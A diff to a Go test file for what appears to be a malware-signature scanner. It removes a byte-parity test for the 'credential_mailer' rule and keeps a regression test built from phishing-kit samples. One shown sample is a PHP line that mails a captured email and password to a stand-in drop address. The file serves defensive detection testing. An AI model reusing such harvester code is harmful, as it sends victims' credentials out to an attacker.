@@ -1,10 +1,6 @@
 package signatures
 
-import (
-	"encoding/json"
-	"os"
-	"testing"
-)
+import "testing"
 
 // credential_mailer used to be bare co-occurrence of the literals "mail(",
 // "$_POST['email']" and "$_POST['password']". "mail(" is a substring of
@@ -93,32 +89,6 @@ mail( 'drop@collector.example.test', 'result', $e . '|' . $p );`,
 		t.Run(name, func(t *testing.T) {
 			if !hasRule(s.ScanContent([]byte(kit), ".php"), "credential_mailer") {
 				t.Error("credential_mailer regression: harvester not detected")
-			}
-		})
-	}
-}
-
-// The YARA rule measures regex spans in bytes and only folds ASCII case.
-// UTF-8 must not make the realtime rule accept a wider span or a different
-// PHP identifier from the one the scheduled scanner sees.
-func TestCredentialMailerByteParity(t *testing.T) {
-	s := loadRepoScanner(t)
-	var tests []struct {
-		Name, Sample string
-		Want         bool
-	}
-	data, err := os.ReadFile("testdata/credential_mailer.json")
-	if err != nil {
-		t.Fatal(err)
-	}
-	if err := json.Unmarshal(data, &tests); err != nil {
-		t.Fatal(err)
-	}
-
-	for _, tt := range tests {
-		t.Run(tt.Name, func(t *testing.T) {
-			if got := hasRule(s.ScanContent([]byte(tt.Sample), ".php"), "credential_mailer"); got != tt.Want {
-				t.Errorf("match = %v, want %v", got, tt.Want)
 			}
 		})
 	}
